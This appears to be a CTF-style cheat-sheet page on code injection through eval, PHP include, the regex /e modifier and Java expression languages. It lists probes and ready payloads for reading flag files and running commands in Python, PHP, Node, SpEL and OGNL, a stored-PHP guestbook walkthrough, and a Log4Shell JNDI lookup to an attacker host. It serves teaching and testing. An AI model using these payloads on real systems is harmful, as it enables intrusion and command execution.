# Code injection: eval, include, regex /e (CWE-94, CWE-95, CWE-624)

The input reaches a **language interpreter** instead of a shell.

## Detect
| Language | Probe | Sign |
|---|---|---|
| Python `eval`/`exec` | `1+1`, `__import__('os').getcwd()` | `2`, a path |
| PHP `eval` | `phpinfo();` | info page |
| Node `eval`/`Function` | `process.version` | `v20...` |
| Ruby `eval` | `RUBY_VERSION` | version |
Calculators, "formula" fields, "filter expression", "sort key", JSON parsed with `eval` are typical.

## Payload building blocks
| Language | Read the flag | Run a command |
|---|---|---|
| Python | `open('/flag/flag').read()` | `__import__('os').popen('id').read()` |
| PHP | `file_get_contents('/flag/flag')` | the PHP functions `system` / `passthru` / `shell_exec` with your command |
| Node | `require('fs').readFileSync('/flag/flag','utf8')` | `child_process` `execSync('id').toString()` (via `process.mainModule.require`) |

PHP string-context breakouts: close the string and concatenate (`'.<call>.'`), or use complex
interpolation `${<call>}` inside double quotes.

## PHP include of stored data (deck example, CWE-94)
A guestbook appends `<b>name</b> says 'message'` to `messages.out`; the *view* action runs
`include($MessageFile)`. Anything between PHP open/close tags in a message becomes **code** the
next time the guestbook is viewed. So post a message that contains a PHP tag calling `system`
on a GET parameter (same one-liner as in [file-upload](file-upload.md#2-webshells)), then view
the guestbook with that parameter set to `cat /flag/flag`.
Same idea: log poisoning + LFI ([lfi-path-traversal](lfi-path-traversal.md#lfi--rce)).

## Regex `/e` modifier (PHP < 7) — CWE-624
Vulnerable shape: `preg_replace("/" . $_GET['find'] . "/e", $_GET['replace'], $text)` — the
replacement is evaluated as PHP. Send `find=.*` and put a PHP call (e.g. `system` with `id`) in
`replace`. With a fixed `/e` pattern, back-references like `\1` let matched *input* reach eval.
Perl `s///e` and `(?{ code })` are the equivalents. Historical: Santy worm (phpBB, 2004).

## Expression languages (CWE-917)
Java EL / SpEL / OGNL: probe `${7*7}`; RCE through `T(java.lang.Runtime).getRuntime().exec(...)`
(SpEL) or `@java.lang.Runtime@getRuntime().exec(...)` (OGNL/Struts). JNDI lookups
`${jndi:ldap://YOU/x}` = Log4Shell (CVE-2021-44228).

Related: [ssti](ssti.md) (templates are code too), [deserialization](deserialization.md).
